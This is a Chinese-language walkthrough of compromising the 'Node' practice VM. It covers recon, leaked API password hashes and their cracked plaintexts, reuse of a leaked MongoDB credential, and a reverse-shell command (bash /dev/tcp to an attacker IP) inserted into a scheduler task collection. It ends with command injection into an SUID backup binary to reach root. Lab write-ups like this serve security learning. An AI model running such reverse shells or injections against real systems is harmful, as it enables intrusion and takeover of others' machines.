---
title: Node靶机
---



# Node

## 扫描

### 看本地ip扫描

```
arp-scan -l
得到172.20.10.7
```

### 扫端口

得到22和3000

```
nmap -A 172.20.10.7
```

![image-20221207203647331](./img/image-20221207203647331.png)

### dirsearch

扫描啥都没有只有个assets和uploads

![image-20221207203818632](./img/image-20221207203818632.png)



### 源码泄漏

![image-20221207203916672](./img/image-20221207203916672.png)

```
var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});
```

在http://172.20.10.7:3000/assets/js/app/controllers/profile.js中发现

```
var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```



访问apiusers路由获得密码

```
[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
```

cmd5破解网站获得密码，最主要第一个人还是admin

```
myP14ceAdm1nAcc0uNT-manchester
tom-spongebob
mark-snowflake
```

### 下载备份文件

使用admin密码登陆

![image-20221207205141966](./img/image-20221207205141966.png)

下载下来看着很像base64编码的结果，base64 -d以后发现是个压缩包，打开需要密码

获得密码magic word

![image-20221207210349893](./img/image-20221207210349893.png)

解压后获取到配置信息

```
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

因为没有开数据库端口所以只能测试能不能ssh登陆，登陆成功

## 尝试suid提权

```
find / -user root -perm -4000 -print 2>/dev/null

/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
```

这里发现一个很有趣的东西backup文件,之前源码当中app.js有

```
app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });
```



## 发现tom账号下神秘文件

应该要登录tom的ssh

![image-20221207212112397](./img/image-20221207212112397.png)

发现node是以tom的身份运行的，所以如果node能rce我们就能获取tom的权限，看看定时任务的app.js在干嘛

![image-20221207212154365](./img/image-20221207212154365.png)

查看app.js内容

```javascript
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

发现存在rce漏洞

```
 mongo -u mark -p 5AYRft73VtFpc84k scheduler
```

根据上述代码我们执行

```
> show collections;
tasks
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/172.20.10.12/1235 0>&1'"})
WriteResult({ "nInserted" : 1 })
发现不好用需要一个pty的shell

```

bash -c 'bash -i >& /dev/tcp/172.20.10.12/1236 0>&1'

## flag1

![image-20221207215222421](./img/image-20221207215222421.png)

backup -q "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474" "

backup -q '' $(python3 1.py);





## flag2

解码就行很简单

![image-20221207223843361](./img/image-20221207223843361.png)



## 获取root

斜杠截断/dev/null

```
backup -q "" '            
> /bin/bash
> '
```

![image-20221207230524986](./img/image-20221207230524986.png)

获取root

![image-20221207230639583](./img/image-20221207230639583.png)

